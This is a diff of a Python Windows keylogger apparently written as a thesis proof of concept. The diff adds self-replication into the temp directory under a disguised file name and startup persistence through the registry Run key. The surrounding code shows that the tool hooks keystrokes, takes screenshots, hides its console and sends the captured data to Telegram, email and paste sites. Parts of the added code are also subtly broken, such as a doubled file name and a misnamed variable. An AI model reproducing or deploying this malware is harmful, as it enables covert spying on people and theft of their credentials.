@@ -29,14 +29,7 @@
 #                   * Send images and paste urls to a Telegram private Channel with a Telegram Bot
 #                   * Send data to a Twitter account (to do)
 #
-#
-# Required:         Install with "pip install module-name-required"
-#                   pywin32, pyWinhook, win32gui, requests, wxPython, urllib2, mss
-#                   This list could be incomplete, please check requeriments.txt file
-#
-# Binary Gen:       To create the executable in Windows, PyInstaller has been used.
-#                   Executable compression is disabled and the creation of a single file is forced.
-#                   pyinstaller --noupx -F demonseye.py
+# Build info:       For required modules and executable generation, please read the files in the /docs folder.
 #
 # Notes:            This code has been tested, developed and designed to work in a Windows 10 x64 environment.
 #                   Its purpose is only educational.
@@ -90,12 +83,12 @@ VERSION = '0.0.1'                       # Version
 LOGGING_LEVEL = logging.DEBUG           # Log level. Can be -> DEBUG, INFO, WARNING, ERROR, CRITICAL
 LOG_FILENAME = 'DEKlogger.log'          # File name for the Log Level registered data (not keystrokes logging)
 CRLF = '\n'                             # Line Feed
-KLGPRE = 'klg_'                         # Keylogger file name prefix (keystrokes logging)
-KLGEXT = '.dek'                         # Keylogger file extension
+KLGPRE = 'klg_'                         # Keylogger file name prefix (keystrokes logging and executable replicate)
+KLGEXT = '.dek'                         # Keylogger file extension for data file
 SCRPRE = 'scr_'                         # Screenshot file name prefix
 SCREXT = '.png'                         # Screenshot file extension
-KEYCODE_EXIT = 7                        # CTRL + G : special combination to close / deactivate keylogger
-KEYSTOSCREENSHOT = 75                   # Screenshots every x Keystrokes
+KEYCODE_EXIT = 6                        # CTRL + E : special combination to close / deactivate keylogger
+KEYSTOSCREENSHOT = 100                  # Screenshots every x Keystrokes (default value)
 
 # Server constants
 SERVER_IP = ''
@@ -446,17 +439,6 @@ def paste_file(file_name, service):
     return url_file_pasted
 
 
-# Add the file to the startup registry key
-def add_keylogger_to_startup():
-    fp = os.path.dirname(os.path.realpath(__file__))
-    fileName = sys.argv[0].split('\\')[-1]
-    newFilePath = fp + '\\' + fileName
-    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
-    key2Change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
-    winreg.SetValueEx(key2Change, 'DEK', 0, REG_SZ, newFilePath)
-    # TODO: Not tested
-
-
 # Mail info send
 def send_email(message):
     if not config.SEND_EMAIL_ENABLED:
@@ -697,21 +679,17 @@ def on_keyboard_event(event):
 
     try:
         # Logging and verbose (for debug) of keystrokes and related info
-        msg = 'Time: ' + repr(event.Time)
-        logging.debug(msg)
-        msg = 'MessageName: ' + repr(event.MessageName) + ' Message: ' + repr(event.Message)
+        msg = 'Time: ' + repr(event.Time) + \
+              ' MessageName: ' + repr(event.MessageName) + ' Message: ' + repr(event.Message)
         logging.debug(msg)
         msg = 'Window: ' + repr(event.Window) + ' WindowName: ' + event.WindowName
         logging.debug(msg)
-        msg = 'Ascii: ' + repr(event.Ascii) + ' Chr: ' + repr(chr(event.Ascii))
+        msg = 'Ascii: ' + repr(event.Ascii) + ' Chr: ' + repr(chr(event.Ascii)) + \
+              ' Key: ' + repr(event.Key) + ' KeyID: ' + repr(event.KeyID)
         logging.debug(msg)
-        msg = 'Key: ' + repr(event.Key) + ' KeyID: ' + repr(event.KeyID)
-        logging.debug(msg)
-        msg = 'ScanCode: ' + repr(event.ScanCode) + ' Extended: ' + repr(event.Extended)
-        logging.debug(msg)
-        msg = 'Injected: ' + repr(event.Injected) + ' Alt: ' + repr(event.Alt)
-        logging.debug(msg)
-        msg = 'Transition: ' + repr(event.Transition)
+        msg = 'ScanCode: ' + repr(event.ScanCode) + ' Extended: ' + repr(event.Extended) + \
+              ' Injected: ' + repr(event.Injected) + ' Alt: ' + repr(event.Alt) + \
+              ' Transition: ' + repr(event.Transition)
         logging.debug(msg)
 
         # If user change active window or is the first time, saves Window Name
@@ -735,19 +713,23 @@ def on_keyboard_event(event):
 
     # Exit control, Disables Hook
     if close_app:
-        hm.UnhookKeyboard()
-        hm.UnhookMouse()
-        server.stop_server()
-        # kill_server_clients()
-        exit_program()
+        exit_demonseye()
 
     return True     # IMPORTANT. True must be returned
 
 
 # Actions to do before Exit program
-def exit_program():
+def exit_demonseye():
     global key_buffer, threadList, server, hm, keylog_name
-    logging.debug('Entering exit_program')
+    logging.debug('Entering exit_demonseye')
+
+    # Unhooking
+    hm.UnhookKeyboard()
+    hm.UnhookMouse()
+
+    # Stopping server
+    server.stop_server()
+    # kill_server_clients()
 
     # do a last screenshot
     capture_screen()
@@ -777,44 +759,45 @@ def exit_program():
     sys.exit(0)
 
 
-# When program is closed
-def on_close_program():
-    global key_buffer, threadList, server, hm, keylog_name
-    logging.debug('Entering on_close_program')
+# Add the file to the startup registry key
+def add_keylogger_to_startup(exec_name):
+    if exec_name == "":
+        logging.debug('No hay nombre de fichero ejecutable. No añado al registro.')
+        return False
+    else:
+        logging.debug('Añade ejecutable {} en Registro de Windows para autoejecución'.format(exec_name))
+        keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
+        try:
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, keyVal, 0, winreg.KEY_ALL_ACCESS)
+        except:
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyVal)
+        exec_name += exec_name + " -s"      # adds start option
+        winreg.SetValueEx(key, 'DEK', 0, winreg.REG_SZ, exec_name)
+        winreg.CloseKey(key)
+        return True
 
-    # ejecuta ultima captura de pantalla antes de cerrar - do a last screenshot
-    capture_screen()
 
-    # registra en fichero de log el cerrado del programa con fecha y hora
-    # saves to keylog file the Closing Event, Date and Time
-    key_buffer += CRLF + CRLF
-    key_buffer += '[CLOSING PROGRAM]' + CRLF
-    key_buffer += 'datetime=' + datetime.datetime.now().strftime('%Y-%m-%d %H:%M') + CRLF
+# Replicate executable into temp directory and returns new fake filename
+# Note that this is only effective with the compiled version on an .exe
+def self_replicate(exec_name):
+    if execname == "":
+        logging.debug('No hay nombre de ejecutable. No replica.')
+        return ""
+    else:
+        ext = '.exe'
+        if os.path.splitext(exec_name)[1] == ext:
+            fake_name = tempfile.mkstemp(ext, KLGPRE)[1]
+            logging.debug('Replica ejecutable {} sobre {}'.format(exec_name, fake_name))
+            with open(exec_name, 'rb') as f_source:
+                with open(fake_name, 'wb') as f_destination:
+                    f_destination.write(f_source.read())
+            f_source.close()
+            f_destination.close()
+            return fake_name
+        else:
+            logging.debug('No es un ejecutable. No replica {}'.format(execname))
+            return ""
 
-    # se asegura de vaciar buffer - empty the key buffer to disk
-    flush_key_buffer_to_disk()
-
-    # envia ultimo fichero de log de teclas - send de last keylog capture file
-    send_keylog_file(keylog_name)
-
-    # espera que finalicen todos los threads que pueda haber activos
-    # wait to all threads are finished
-    for thr in threadList:
-        thr.join()
-
-    # borra ficheros temporales - delete temp files
-    deleted = delete_keylog_tempfile()
-    deleted = delete_keylog_tempfile(SCRPRE + '*' + SCREXT, 'Borrado captura pantalla')
-
-    logging.info('Cerrando')
-    logging.shutdown()
-
-    return True
-
-'''
-Control parametros linea de comando, para instalar, configurar, ajustar.
-NO IMPLEMENTADO TODAVIA
-'''
 
 # Return Logging Level
 def set_logging_level(verbose_level):
@@ -835,12 +818,16 @@ def parse_params():
                                      epilog='Keylogger POC for MCS TFM La Salle 2019 by Gabriel Marti.')
     parser.add_argument('-s', '--start', action='store_true', required=True,
                         help='Specify -s or --start to start Keylogger')
+    parser.add_argument('-n', '--nohide', action='store_true', required=False,
+                        help='No Hide console. Only for Debug.')
     parser.add_argument('-k', '--keystoscreenshot', type=int, default=KEYSTOSCREENSHOT,
                         help='Number of keystrokes to take a screenshot. Default value: {}'.format(KEYSTOSCREENSHOT))
+    parser.add_argument('--replicate', action='store_true', required=False, default=False,
+                        help='Self-replicate and permanent install into registry')
     parser.add_argument('--noscreenshot', action='store_true', required=False, default=False,
                         help='Disable Screenshot capture')
     parser.add_argument('-v', '--verbose', type=int, choices=[0, 1, 2, 3, 4, 5], default=0,
-                        help='Debug verbose to screen. Default value: 0')
+                        help='Debug verbose to console when testing. Default value: 0')
     parser.add_argument('-f', '--logtofile', action='store_true', required=False, default=False,
                         help='If set, log messages are saved to {}. Default value: 0'.format(LOG_FILENAME))
     args_parsed = parser.parse_args()
@@ -875,15 +862,17 @@ hostname = socket.gethostname()
 username = getpass.getuser()
 localip = socket.gethostbyname(hostname)
 externalip = get_external_ip()
-execname = sys.argv[0]  # modo alternativo > execname = os.path.realpath(__file__)
-extension = os.path.splitext(__file__)[1]
-driveunit = os.path.splitdrive(__file__)[0]
+execname = sys.argv[0]
+filerealpath = os.path.realpath(execname)
+extension = os.path.splitext(filerealpath)[1]
+driveunit = os.path.splitdrive(filerealpath)[0]
 
 # Ensures that keylogger starts at system startup
 # add_keylogger_to_startup()
 
 # Hide console Window
-hide_console()
+if not args.nohide:
+    hide_console()
 
 # Delete old keylog files if exists
 delete_keylog_tempfile()
@@ -894,8 +883,11 @@ delete_keylog_tempfile(SCRPRE + '*' + SCREXT, 'Borrado captura de pantalla anter
 # Create new keylog file
 create_keylog_file()
 
+# Replicate current executable file into temp directory and adds to Windows startup
+if args.replicate:
+    add_keylogger_to_startup(self_replicate(filerealpath))
+
 # Creates new hook manager
-# Info: https://www.cs.unc.edu/Research/assist/doc/pyhook/public/pyHook.HookManager.HookManager-class.html
 hm = pyHook.HookManager()
 
 # Register event callbacks
@@ -913,9 +905,6 @@ server.start()
 
 # Telegram Bot start message - Simply as a testimonial notification
 telegram_bot_message('Starting ' + APPNAME + ' v' + VERSION)
-
-# Handler to do actions when application is closed
-# atexit.register(on_close_program)
 
 # Wait indefinitely
 pythoncom.PumpMessages()
